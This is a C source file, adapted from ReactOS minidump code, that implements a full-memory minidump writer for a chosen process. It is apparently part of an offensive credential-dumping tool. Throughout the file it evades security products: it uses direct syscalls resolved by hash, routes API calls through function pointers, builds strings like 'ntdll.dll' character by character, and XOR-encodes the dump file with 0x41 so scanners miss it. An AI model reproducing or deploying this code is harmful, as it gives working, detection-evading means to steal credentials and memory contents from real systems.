/*
  * This library is free software; you can redistribute it and/or
  * modify it under the terms of the GNU Lesser General Public
  * License as published by the Free Software Foundation; either
  * version 2.1 of the License, or (at your option) any later version.
  *
  * This library is distributed in the hope that it will be useful,
  * but WITHOUT ANY WARRANTY; without even the implied warranty of
  * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
  * Lesser General Public License for more details.
  *
  * You should have received a copy of the GNU Lesser General Public
  * License along with this library; if not, write to the Free Software
  * Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301, USA
*/
 
/* Based on https://doxygen.reactos.org/d8/d5d/minidump_8c_source.html */

#include "DumpTools.h"

#include "stdio.h"

static int
mytowlower(wint_t c) {

    int ret = (int)c;

    if (c <= L'Z' && c >= 'A') {
        ret += 32;
    }

    return ret;

}

static BOOL ObfWriteFile(HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped, struct fPtrs* function_ptrs) {

    void* ptr_encoded_buffer = NULL;
    BOOL success = FALSE;

    ptr_encoded_buffer = function_ptrs->_HeapAlloc(function_ptrs->_GetProcessHeap(), 0, nNumberOfBytesToWrite);
    if(ptr_encoded_buffer == NULL)
        goto cleanup;

    for (unsigned i = 0; i < nNumberOfBytesToWrite; i++)
        *((BYTE*)ptr_encoded_buffer + i) = *((BYTE*)lpBuffer + i);

    for (unsigned i = 0; i < nNumberOfBytesToWrite; i++)
        *((BYTE*)ptr_encoded_buffer + i) ^= 0x41;

    success = function_ptrs->_WriteFile(hFile, ptr_encoded_buffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten, NULL);

cleanup:
    if(ptr_encoded_buffer)
        function_ptrs->_HeapFree(function_ptrs->_GetProcessHeap(), 0, ptr_encoded_buffer);

    return success;

}


static BOOL fetch_process_info(struct dump_context* dc, struct fPtrs *function_ptrs)
{

    ULONG       buf_size = 0x1000;
    NTSTATUS    nts;
    SYSTEM_PROCESS_INFORMATION* pcs_buffer = NULL;

    DWORD dwSuccess = FAIL;
    Syscall sysNtQuerySystemInformation = { 0x00 };

    dwSuccess = getSyscall(0xaf0d30ec, &sysNtQuerySystemInformation);
    if(dwSuccess == FAIL)
      goto failed;

    if (!(pcs_buffer = (SYSTEM_PROCESS_INFORMATION*)function_ptrs->_HeapAlloc(function_ptrs->_GetProcessHeap(), 0, buf_size))) return FALSE;
    for (;;)
    {
        PrepareSyscall(sysNtQuerySystemInformation.dwSyscallNr, sysNtQuerySystemInformation.pRecycledGate);
        nts = DoSyscall(SystemProcessInformation,
            pcs_buffer, buf_size, NULL);
        if (nts != 0xC0000004L) break;
        pcs_buffer = (SYSTEM_PROCESS_INFORMATION*)function_ptrs->_HeapReAlloc(function_ptrs->_GetProcessHeap(), 0, pcs_buffer, buf_size *= 2);
        if (!pcs_buffer) return FALSE;
    }

    if (nts == 0)
    {
        SYSTEM_PROCESS_INFORMATION* spi = pcs_buffer;

        for (;;)
        {
            if (HandleToUlong(spi->UniqueProcessId) == dc->pid)
            {
                dc->num_threads = spi->NumberOfThreads;
                dc->threads = (struct dump_thread*)function_ptrs->_HeapAlloc(function_ptrs->_GetProcessHeap(), 0,
                    dc->num_threads * sizeof(dc->threads[0]));
                if (!dc->threads) goto failed;
                function_ptrs->_HeapFree(function_ptrs->_GetProcessHeap(), 0, pcs_buffer);
                return TRUE;
            }
            if (!spi->NextEntryOffset) break;
            spi = (SYSTEM_PROCESS_INFORMATION*)((char*)spi + spi->NextEntryOffset);
        }
    }

failed:

    if(pcs_buffer)
      function_ptrs->_HeapFree(function_ptrs->_GetProcessHeap(), 0, pcs_buffer);

    return FALSE;
}

static void writeat(struct dump_context* dc, RVA rva, const void* data, unsigned size, struct fPtrs* function_pointers)
{

    DWORD       written;

    function_pointers->_SetFilePointer(dc->hFile, rva, NULL, FILE_BEGIN);
    ObfWriteFile(dc->hFile, data, size, &written, NULL, function_pointers);

}

static void append(struct dump_context* dc, const void* data, unsigned size, struct fPtrs *function_pointers)
{
    writeat(dc, dc->rva, data, size, function_pointers);
    dc->rva += size;
}

static  unsigned        dump_system_info(struct dump_context* dc, struct fPtrs *function_pointers)
{

    MINIDUMP_SYSTEM_INFO        mdSysInfo;
    SYSTEM_INFO                 sysInfo;
    OSVERSIONINFOW              osInfo;
    DWORD                       written;
    ULONG                       slen;
    DWORD                       wine_extra = 0;

    function_pointers->_GetSystemInfo(&sysInfo);
    osInfo.dwOSVersionInfoSize = sizeof(osInfo);

    typedef int(WINAPI* RtlGetNtVersionNumbers)(PDWORD, PDWORD, PDWORD);

    char ntdll[] = { 'n', 't', 'd', 'l', 'l', '.', 'd','l','l',0x00 };
    char func[] = { 'R', 't', 'l','G','e','t','N','t','V','e','r','s','i','o','n','N','u','m','b','e','r','s',0x00 };
    HINSTANCE hinst = function_pointers->_LoadLibrary(ntdll);
    DWORD dwMajor, dwMinor, dwBuildNumber;
    RtlGetNtVersionNumbers proc = (RtlGetNtVersionNumbers)function_pointers->_GetProcAddress(hinst, func);
    proc(&dwMajor, &dwMinor, &dwBuildNumber);
    dwBuildNumber &= 0xffff;
    function_pointers->_FreeLibrary(hinst);

    mdSysInfo.ProcessorArchitecture = sysInfo.wProcessorArchitecture;
    mdSysInfo.ProcessorLevel = sysInfo.wProcessorLevel;
    mdSysInfo.ProcessorRevision = sysInfo.wProcessorRevision;
    mdSysInfo.NumberOfProcessors = (UCHAR)sysInfo.dwNumberOfProcessors;
    mdSysInfo.ProductType = VER_NT_WORKSTATION; /* This might need fixing */
    mdSysInfo.MajorVersion = dwMajor;
    mdSysInfo.MinorVersion = dwMinor;
    mdSysInfo.BuildNumber = dwBuildNumber;
    mdSysInfo.PlatformId = 0x2;

    mdSysInfo.CSDVersionRva = dc->rva + sizeof(mdSysInfo) + wine_extra;
    mdSysInfo.Reserved1 = 0;
    mdSysInfo.SuiteMask = VER_SUITE_TERMINAL;

    unsigned        i;
    ULONG64         one = 1;

    mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0] = 0;
    mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[1] = 0;

    for (i = 0; i < sizeof(mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0]) * 8; i++)
        if (function_pointers->_IsProcessorFeaturePresent(i))
            mdSysInfo.Cpu.OtherCpuInfo.ProcessorFeatures[0] |= one << i;

    append(dc, &mdSysInfo, sizeof(mdSysInfo), function_pointers);

    WCHAR szCSDVersion[256] = { 0x00 };
    slen = function_pointers->_lstrlenW(szCSDVersion) * sizeof(WCHAR);
    ObfWriteFile(dc->hFile, &slen, sizeof(slen), &written, NULL, function_pointers);
    ObfWriteFile(dc->hFile, szCSDVersion, slen, &written, NULL, function_pointers);
    dc->rva += sizeof(ULONG) + slen;

    return sizeof(mdSysInfo);
}

void minidump_add_memory_block(struct dump_context* dc, ULONG64 base, ULONG size, ULONG rva, struct fPtrs *function_pointers)
{

    if (!dc->mem)
    {
        dc->alloc_mem = 32;
        dc->mem = (struct dump_memory*)function_pointers->_HeapAlloc(function_pointers->_GetProcessHeap(), 0, dc->alloc_mem * sizeof(*dc->mem));
    }
    else if (dc->num_mem >= dc->alloc_mem)
    {
        dc->alloc_mem *= 2;
        dc->mem = (struct dump_memory*)function_pointers->_HeapReAlloc(function_pointers->_GetProcessHeap(), 0, dc->mem,
            dc->alloc_mem * sizeof(*dc->mem));
    }
    if (dc->mem)
    {
        dc->mem[dc->num_mem].base = base;
        dc->mem[dc->num_mem].size = size;
        dc->mem[dc->num_mem].rva = rva;
        dc->num_mem++;
    }

    else dc->num_mem = dc->alloc_mem = 0;

}


static void minidump_add_memory64_block(struct dump_context* dc, ULONG64 base, ULONG64 size, struct fPtrs* function_pointers)
{

    if (!dc->mem64)
    {
        dc->alloc_mem64 = 32;
        dc->mem64 = (struct dump_memory64*)function_pointers->_HeapAlloc(function_pointers->_GetProcessHeap(), 0, dc->alloc_mem64 * sizeof(*dc->mem64));
    }
    else if (dc->num_mem64 >= dc->alloc_mem64)
    {
        dc->alloc_mem64 *= 2;
        dc->mem64 = (struct dump_memory64*)function_pointers->_HeapReAlloc(function_pointers->_GetProcessHeap(), 0, dc->mem64,
            dc->alloc_mem64 * sizeof(*dc->mem64));
    }
    if (dc->mem64)
    {
        dc->mem64[dc->num_mem64].base = base;
        dc->mem64[dc->num_mem64].size = size;
        dc->num_mem64++;
    }
    else dc->num_mem64 = dc->alloc_mem64 = 0;
}

static void fetch_memory64_info(struct dump_context* dc, struct fPtrs *function_pointers)
{

    ULONG_PTR                   addr;
    MEMORY_BASIC_INFORMATION    mbi;

    addr = 0;
    while (function_pointers->_VirtualQueryEx(dc->handle, (LPCVOID)addr, &mbi, sizeof(mbi)) != 0)
    {
        /* Memory regions with state MEM_COMMIT will be added to the dump */
        if (mbi.State == MEM_COMMIT)
        {
            minidump_add_memory64_block(dc, (ULONG_PTR)mbi.BaseAddress, mbi.RegionSize, function_pointers);
        }

        if ((addr + mbi.RegionSize) < addr)
            break;

        addr = (ULONG_PTR)mbi.BaseAddress + mbi.RegionSize;
    }
}

static inline BOOL read_process_memory(HANDLE process, UINT64 addr, void* buf, size_t size, Syscall *sysNtReadVirtualMemory)
{

    SIZE_T read = 0;
    PrepareSyscall(sysNtReadVirtualMemory->dwSyscallNr, sysNtReadVirtualMemory->pRecycledGate);
    NTSTATUS res = DoSyscall(process, (PVOID*)addr, buf, size, &read);
    return !res;
}

static unsigned         dump_memory64_info(struct dump_context* dc, struct fPtrs* function_pointers)
{

    MINIDUMP_MEMORY64_LIST          mdMem64List;
    MINIDUMP_MEMORY_DESCRIPTOR64    mdMem64;
    DWORD                           written;
    unsigned                        i, len, sz;
    RVA                             rva_base;
    char                            tmp[1024];
    ULONG64                         pos;
    LARGE_INTEGER                   filepos;
    DWORD dwSuccess = FAIL;

    Syscall sysNtReadVirtualMemory = { 0x00 };
    dwSuccess = getSyscall(0x830221a7, &sysNtReadVirtualMemory);
    if(dwSuccess == FAIL)
      return FALSE;

    sz = sizeof(mdMem64List.NumberOfMemoryRanges) +
        sizeof(mdMem64List.BaseRva) +
        dc->num_mem64 * sizeof(mdMem64);

    mdMem64List.NumberOfMemoryRanges = dc->num_mem64;
    mdMem64List.BaseRva = dc->rva + sz;

    append(dc, &mdMem64List.NumberOfMemoryRanges,
        sizeof(mdMem64List.NumberOfMemoryRanges), function_pointers);
    append(dc, &mdMem64List.BaseRva,
        sizeof(mdMem64List.BaseRva), function_pointers);

    rva_base = dc->rva;
    dc->rva += dc->num_mem64 * sizeof(mdMem64);

    /* dc->rva is not updated past this point. The end of the dump
     * is just the full memory data. */
    filepos.QuadPart = dc->rva;
    for (i = 0; i < dc->num_mem64; i++)
    {
        mdMem64.StartOfMemoryRange = dc->mem64[i].base;
        mdMem64.DataSize = dc->mem64[i].size;
        function_pointers->_SetFilePointerEx(dc->hFile, filepos, NULL, FILE_BEGIN);
        for (pos = 0; pos < dc->mem64[i].size; pos += sizeof(tmp))
        {
            len = (unsigned)(min(dc->mem64[i].size - pos, sizeof(tmp)));
            if (read_process_memory(dc->handle, dc->mem64[i].base + pos, tmp, len, &sysNtReadVirtualMemory))
                ObfWriteFile(dc->hFile, tmp, len, &written, NULL, function_pointers);
        }
        filepos.QuadPart += mdMem64.DataSize;
        writeat(dc, rva_base + i * sizeof(mdMem64), &mdMem64, sizeof(mdMem64), function_pointers);
    }

    return sz;
}

static void fetch_module_versioninfo(LPCWSTR filename, VS_FIXEDFILEINFO* ffi, struct fPtrs* function_ptrs)
{

    DWORD       handle;
    DWORD       sz;
    WCHAR backslashW[] = { '\\', '\0' };

    //memset(ffi, 0, sizeof(*ffi));
    for (uint32_t i = 0; i < sizeof(*ffi); i++) {
        *((uint8_t*)(ffi) + i) = 0x00;
    }

    if ((sz = function_ptrs->_GetFileVersionInfoSizeW(filename, &handle)))
    {
        void* info = function_ptrs->_HeapAlloc(function_ptrs->_GetProcessHeap(), 0, sz);
        if (info && function_ptrs->_GetFileVersionInfoW(filename, handle, sz, info))
        {
            VS_FIXEDFILEINFO* ptr;
            UINT    len;

            if (function_ptrs->_VerQueryValueW(info, backslashW, (LPVOID*)&ptr, &len)) {
                //memcpy(ffi, ptr, min(len, sizeof(*ffi)));
                function_ptrs->_CopyMemory(ffi, ptr, min(len, sizeof(*ffi)));
                /*for (uint32_t i = 0; i < min(len, sizeof(*ffi)); i++) {
                    *((uint8_t*)(ffi)+i) = *((uint8_t*)(ptr)+i);
                }*/
            }

        }

        if(info)
            function_ptrs->_HeapFree(function_ptrs->_GetProcessHeap(), 0, info);
      
    }
}

static  unsigned        dump_modules(struct dump_context* dc, BOOL dump_elf, struct fPtrs* function_ptrs)
{

    MINIDUMP_MODULE             mdModule;
    MINIDUMP_MODULE_LIST        mdModuleList;
    char                        tmp[1024];
    MINIDUMP_STRING* ms = (MINIDUMP_STRING*)tmp;
    ULONG                       i, nmod;
    RVA                         rva_base;
    DWORD                       flags_out;
    unsigned                    sz;

    for (i = nmod = 0; i < dc->num_modules; i++)
    {
        if ((dc->modules[i].is_elf && dump_elf) ||
            (!dc->modules[i].is_elf && !dump_elf))
            nmod++;
    }

    mdModuleList.NumberOfModules = 0;
    rva_base = dc->rva;
    dc->rva += sz = sizeof(mdModuleList.NumberOfModules) + sizeof(mdModule) * nmod;

    for (i = 0; i < dc->num_modules; i++)
    {
        if ((dc->modules[i].is_elf && !dump_elf) ||
            (!dc->modules[i].is_elf && dump_elf))
            continue;

        flags_out = ModuleWriteModule | ModuleWriteMiscRecord | ModuleWriteCvRecord;
        if (dc->type & MiniDumpWithDataSegs)
            flags_out |= ModuleWriteDataSeg;
        if (dc->type & MiniDumpWithProcessThreadData)
            flags_out |= ModuleWriteTlsData;
        if (dc->type & MiniDumpWithCodeSegs)
            flags_out |= ModuleWriteCodeSegs;

        ms->Length = (function_ptrs->_lstrlenW(dc->modules[i].name) + 1) * sizeof(WCHAR);

        function_ptrs->_lstrcpyW(ms->Buffer, dc->modules[i].name);

        if (flags_out & ModuleWriteModule)
        {
            mdModule.BaseOfImage = dc->modules[i].base;
            mdModule.SizeOfImage = dc->modules[i].size;
            mdModule.CheckSum = dc->modules[i].checksum;
            mdModule.TimeDateStamp = dc->modules[i].timestamp;
            mdModule.ModuleNameRva = dc->rva;
            ms->Length -= sizeof(WCHAR);
            append(dc, ms, sizeof(ULONG) + ms->Length + sizeof(WCHAR), function_ptrs);
            fetch_module_versioninfo(ms->Buffer, &mdModule.VersionInfo, function_ptrs);
            mdModule.CvRecord.DataSize = 0;
            mdModule.CvRecord.Rva = 0;
            mdModule.MiscRecord.DataSize = 0;
            mdModule.MiscRecord.Rva = 0;
            mdModule.Reserved0 = 0;
            mdModule.Reserved1 = 0;
            writeat(dc,
                rva_base + sizeof(mdModuleList.NumberOfModules) +
                mdModuleList.NumberOfModules++ * sizeof(mdModule),
                &mdModule, sizeof(mdModule), function_ptrs);
        }
    }
    writeat(dc, rva_base, &mdModuleList.NumberOfModules,
        sizeof(mdModuleList.NumberOfModules), function_ptrs);

    return sz;
}

BOOL validate_addr64(DWORD64 addr)
{
    if (sizeof(void*) == sizeof(int) && (addr >> 32))
    {
        //SetLastError(ERROR_INVALID_PARAMETER);
        return FALSE;
    }
    return TRUE;
}

BOOL pe_load_nt_header(HANDLE hProc, DWORD64 base, IMAGE_NT_HEADERS* nth)
{

    IMAGE_DOS_HEADER    dos = { 0x00 };
    DWORD dwSuccess = FAIL;

    Syscall sysNtReadVirtualMemory = { 0x00 };
    dwSuccess = getSyscall(0x830221a7, &sysNtReadVirtualMemory);
    if(dwSuccess == FAIL){
        return FALSE;
    }

    PrepareSyscall(sysNtReadVirtualMemory.dwSyscallNr, sysNtReadVirtualMemory.pRecycledGate);
    NTSTATUS res = DoSyscall(hProc, (PVOID*)(DWORD_PTR)base, &dos, sizeof(dos), NULL);

    PrepareSyscall(sysNtReadVirtualMemory.dwSyscallNr, sysNtReadVirtualMemory.pRecycledGate);
    NTSTATUS res2 = DoSyscall(hProc, (PVOID*)(DWORD_PTR)(base + dos.e_lfanew), nth, sizeof(*nth), NULL);

    return  !res && dos.e_magic == IMAGE_DOS_SIGNATURE && !res2 && nth->Signature == IMAGE_NT_SIGNATURE;
}

static BOOL add_module(struct dump_context* dc, const WCHAR* name,
    DWORD64 base, DWORD size, DWORD timestamp, DWORD checksum,
    BOOL is_elf, struct fPtrs* function_pointers)
{

    if (!dc->modules)
    {
        dc->alloc_modules = 32;
        dc->modules = (struct dump_module*)function_pointers->_HeapAlloc(function_pointers->_GetProcessHeap(), 0,
            dc->alloc_modules * sizeof(*dc->modules));
    }
    else if (dc->num_modules >= dc->alloc_modules)
    {
        dc->alloc_modules *= 2;
        dc->modules = (struct dump_module*)function_pointers->_HeapReAlloc(function_pointers->_GetProcessHeap(), 0, dc->modules,
            dc->alloc_modules * sizeof(*dc->modules));
    }
    if (!dc->modules)
    {
        dc->alloc_modules = dc->num_modules = 0;
        return FALSE;
    }

    function_pointers->_GetModuleFileNameExW(dc->handle, (HMODULE)(DWORD_PTR)base, dc->modules[dc->num_modules].name, ARRAY_SIZE(dc->modules[dc->num_modules].name));

    dc->modules[dc->num_modules].base = base;
    dc->modules[dc->num_modules].size = size;
    dc->modules[dc->num_modules].timestamp = timestamp;
    dc->modules[dc->num_modules].checksum = checksum;
    dc->modules[dc->num_modules].is_elf = is_elf;
    dc->num_modules++;

    return TRUE;
}


static BOOL WINAPI fetch_pe_module_info_cb(PCWSTR name, DWORD64 base, ULONG size,
    PVOID user, struct fPtrs* function_pointers)
{
    struct dump_context* dc = (struct dump_context*)user;
    IMAGE_NT_HEADERS            nth;

    if (!validate_addr64(base)) return FALSE;

    if (pe_load_nt_header(dc->handle, base, &nth))
        add_module((struct dump_context*)user, name, base, size,
            nth.FileHeader.TimeDateStamp, nth.OptionalHeader.CheckSum,
            FALSE, function_pointers);

    return TRUE;
}

static const WCHAR* get_filename(const WCHAR* name, const WCHAR* endptr, struct fPtrs* function_pointers)
{

    const WCHAR* ptr;
    char fwd_slash[] = { '/', 0x00 };
    char back_slash[] = { '\\', 0x00 };

    if (!endptr) endptr = name + function_pointers->_lstrlenW(name);
    for (ptr = endptr - 1; ptr >= name; ptr--)
    {
        if (*ptr == fwd_slash[0] || *ptr == back_slash[0]) break;
    }
    return ++ptr;
}

static int match_ext(const WCHAR* ptr, size_t len, struct fPtrs* function_pointers)
{

    WCHAR S_AcmW[] = { '.','a','c','m','\0' };
    WCHAR S_DllW[] = { '.','d','l','l','\0' };
    WCHAR S_DrvW[] = { '.','d','r','v','\0' };
    WCHAR S_ExeW[] = { '.','e','x','e','\0' };
    WCHAR S_OcxW[] = { '.','o','c','x','\0' };
    WCHAR S_VxdW[] = { '.','v','x','d','\0' };
    WCHAR* const ext[] = { S_AcmW, S_DllW, S_DrvW, S_ExeW, S_OcxW, S_VxdW, NULL };

    WCHAR* const* e;
    size_t      l;

    for (e = ext; *e; e++)
    {
        l = function_pointers->_lstrlenW(*e);
        if (l >= len) return 0;
        if (function_pointers->_lstrcmpW(&ptr[len - l], *e)) continue;
        return l;
    }
    return 0;
}

static void module_fill_module(const WCHAR* in, WCHAR* out, size_t size, struct fPtrs * function_ptrs)
{

    WCHAR S_DotSoW[] = { '.','s','o','\0' };
    WCHAR        S_ElfW[] = { '<','e','l','f','>','\0' };

    const WCHAR* ptr, * endptr;
    size_t      len, l;

    ptr = get_filename(in, endptr = in + function_ptrs->_lstrlenW(in), function_ptrs);
    len = min(endptr - ptr, size - 1);
    //memcpy(out, ptr, len * sizeof(WCHAR));
    function_ptrs->_CopyMemory(out, (void*)ptr, size -1);
    /*for (uint32_t i = 0; i < size -1 ; i++) {
        *((uint8_t*)(out)+i) = *((uint8_t*)(ptr)+i);
    }*/

    out[len] = '\0';
    if (len > 4 && (l = match_ext(out, len, function_ptrs)))
        out[len - l] = '\0';
    else
    {
        if (len > 3 && !function_ptrs->_lstrcmpW(&out[len - 3], S_DotSoW) &&
            (l = match_ext(out, len - 3, function_ptrs)))
            function_ptrs->_lstrcpyW(&out[len - l - 3], S_ElfW);
    }
    while ((*out = mytowlower(*out))) out++;
}

static void fetch_modules_info(struct dump_context* dc, struct fPtrs* function_ptrs)
{

    HMODULE modules[512] = { 0x00 };
    MODULEINFO  mi = { 0x00 };
    WCHAR       baseW[256] = { 0x00 }, modW[256] = { 0x00 };

    DWORD i = 0x00, sz = 0x00;

    function_ptrs->_EnumProcessModules(dc->handle, (HMODULE*)&modules, 512 * sizeof(HMODULE), &sz);
        
    sz /= sizeof(HMODULE);

    for (i = 0; i < sz; i++) {

        if (!function_ptrs->_GetModuleInformation(dc->handle, modules[i], &mi, sizeof(mi)))
            continue;

        if (!function_ptrs->_GetModuleBaseNameW(dc->handle, modules[i], baseW, ARRAY_SIZE(baseW)))
            continue;

        module_fill_module(baseW, modW, ARRAY_SIZE(modW), function_ptrs);
        fetch_pe_module_info_cb(modW, (DWORD_PTR)mi.lpBaseOfDll, mi.SizeOfImage,
            dc, function_ptrs);

    }
    
}

BOOL MiniDumpWriteDumpA(HANDLE hProcess, DWORD pid, HANDLE hFile, struct fPtrs* function_ptrs)
{

    const MINIDUMP_DIRECTORY emptyDir = { UnusedStream, {0, 0} };
    MINIDUMP_HEADER     mdHead;
    MINIDUMP_DIRECTORY  mdDir;
    DWORD               i = 0x00, nStreams = 0x00, idx_stream = 0x00;
    struct dump_context dc;

    const DWORD Flags = MiniDumpWithFullMemory |
        MiniDumpWithFullMemoryInfo |
        MiniDumpWithUnloadedModules;

    MINIDUMP_TYPE DumpType = (MINIDUMP_TYPE)Flags;

    dc.hFile = hFile;
    dc.pid = pid;
    dc.handle = hProcess;
    dc.modules = NULL;
    dc.num_modules = 0;
    dc.alloc_modules = 0;
    dc.threads = NULL;
    dc.num_threads = 0;
    dc.type = DumpType;
    dc.mem = NULL;
    dc.num_mem = 0;
    dc.alloc_mem = 0;
    dc.mem64 = NULL;
    dc.num_mem64 = 0;
    dc.alloc_mem64 = 0;
    dc.rva = 0;

    if (!fetch_process_info(&dc, function_ptrs)) return FALSE;

    fetch_modules_info(&dc, function_ptrs);
    nStreams = 3;
    nStreams = (nStreams + 3) & ~3;

    // Write Header
    mdHead.Signature = 0x504d444d; // minidump_signature
    mdHead.Version = MINIDUMP_VERSION;
    mdHead.NumberOfStreams = nStreams;
    mdHead.CheckSum = 0;
    mdHead.StreamDirectoryRva = sizeof(mdHead);
    //mdHead.TimeDateStamp = time(NULL);
    mdHead.Flags = DumpType;
    append(&dc, &mdHead, sizeof(mdHead), function_ptrs);

    // Write Stream Directories 
    dc.rva += nStreams * sizeof(mdDir);
    idx_stream = 0;

    // Write Data Stream Directories 
    //
    // Must be first in MiniDump
    mdDir.StreamType = SystemInfoStream;
    mdDir.Location.Rva = dc.rva;
    mdDir.Location.DataSize = dump_system_info(&dc, function_ptrs);
    writeat(&dc, mdHead.StreamDirectoryRva + idx_stream++ * sizeof(mdDir),
        &mdDir, sizeof(mdDir), function_ptrs);

    mdDir.StreamType = ModuleListStream;
    mdDir.Location.Rva = dc.rva;
    mdDir.Location.DataSize = dump_modules(&dc, FALSE, function_ptrs);
    writeat(&dc, mdHead.StreamDirectoryRva + idx_stream++ * sizeof(mdDir),
        &mdDir, sizeof(mdDir), function_ptrs);

    fetch_memory64_info(&dc, function_ptrs);
    mdDir.StreamType = Memory64ListStream;
    mdDir.Location.Rva = dc.rva;
    mdDir.Location.DataSize = dump_memory64_info(&dc, function_ptrs);
    writeat(&dc, mdHead.StreamDirectoryRva + idx_stream++ * sizeof(mdDir),
        &mdDir, sizeof(mdDir), function_ptrs);

    // fill the remaining directory entries with 0's (unused stream types)
    // NOTE: this should always come last in the dump!
    for (i = idx_stream; i < nStreams; i++) 
        writeat(&dc, mdHead.StreamDirectoryRva + i * sizeof(emptyDir), &emptyDir, sizeof(emptyDir), function_ptrs);
    
    function_ptrs->_HeapFree(function_ptrs->_GetProcessHeap(), 0, dc.mem);
    function_ptrs->_HeapFree(function_ptrs->_GetProcessHeap(), 0, dc.mem64);
    function_ptrs->_HeapFree(function_ptrs->_GetProcessHeap(), 0, dc.modules);
    function_ptrs->_HeapFree(function_ptrs->_GetProcessHeap(), 0, dc.threads);

    return TRUE;
}

